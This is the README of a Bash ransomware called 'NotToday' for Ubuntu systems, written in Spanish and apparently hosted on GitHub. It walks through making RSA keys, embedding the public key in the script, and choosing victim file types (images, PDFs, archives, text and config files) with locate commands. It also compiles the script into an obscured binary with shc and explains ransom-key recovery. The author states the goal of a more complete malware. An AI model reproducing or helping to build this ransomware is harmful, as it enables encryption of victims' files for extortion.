<p align="center"><img src="https://raw.githubusercontent.com/EduardoDesdes/NotToday/master/ntd.jpeg"</p> 

----

NotToday en un ransomware programado en Bash Scripting de uso para distribuciones Ubuntu y derivados. Creado para la demostracion del funcionamiento de un ransomware y el impacto que este puede desmebocar en un computador. Así mismo el codigo aquí expuesto esta sujeto a cambio y actualizaciones de manera que se logre un malware mucho mas completo.

## Configuracion Inicial
### Creacion de llaves RSA
Creamos una llave privada RSA aleatoria de una cantidad especifica.

    $ openssl genrsa -out clave.pem 4096

Luego creamos la llave publica mediante la llave privada.

    $ openssl rsa -in clave.pem -out clave.pub.pem -outform PEM -pubout
    
### Insertar la llave publica en el codigo
Para esto debemos editar el archivo ***pwn.sh*** por en contenido de la llave publica.
```bash
#Clave Publica
echo "-----BEGIN PUBLIC KEY-----" >> clave.pub.pem
...
...
echo "-----END PUBLIC KEY-----" >> clave.pub.pem
```

### Seleccionar que formato de ficheros desea encriptar
```bash
#Generar los archivos a encriptar
locate -r "\.jpg$" > /tmp/list.ntm
locate -r "\.jpeg$" >> /tmp/list.ntm
locate -r "\.png$" >> /tmp/list.ntm
locate -r "\.pdf$" >> /tmp/list.ntm
locate -r "\.odt$" >> /tmp/list.ntm
locate -r "\.rar$" >> /tmp/list.ntm
locate -r "\.zip$" >> /tmp/list.ntm
locate -r "\.txt$" >> /tmp/list.ntm
locate -r "\.conf$" >> /tmp/list.ntm
```

## Creacion del binario para ejecucion
Para crear el binario usaremos una herramienta llamada ***shc***.

    $ shc -v -r -f pwn.sh
    
Nos encontraremos con dos archivos, ***pwd.sh.x*** y ***pwn.sh.c***.

- ***pwd.sh.x***: El archivo ejecutable del ransomware.
- ***pwn.sh.c***: El script en c del ransomware.

## Recuperar los ficheros encriptados
Al realizarse satisfactoriamente el encriptado de los ficheros el ransomware deja un fichero denominado ***enviame.enc***, se deberá colocar en la misma carpeta que el archivo ***dcry.sh*** y la llave privada ***clave.pem***. Y ejecutar el siguiente comando.

    $ bash dcry.sh

El cual generará un fichero llamado ***key.txt***. Y ahora usaremos el fichero ***repa.sh*** para recuperar todos los archivos encriptados usando la key obtenida.

    $ bash repa.sh

## Creditos

Autor: ***Eduardo Sarria (Desdes)***

Facebook: [https://www.facebook.com/eduardo.s.desdes](https://www.facebook.com/eduardo.s.desdes)

Linkedin: [https://www.linkedin.com/in/eduardodesdes/](https://www.linkedin.com/in/eduardodesdes/)

OpenBugBounty: [https://www.openbugbounty.org/researchers/EduardoDesdes/](https://www.openbugbounty.org/researchers/EduardoDesdes/)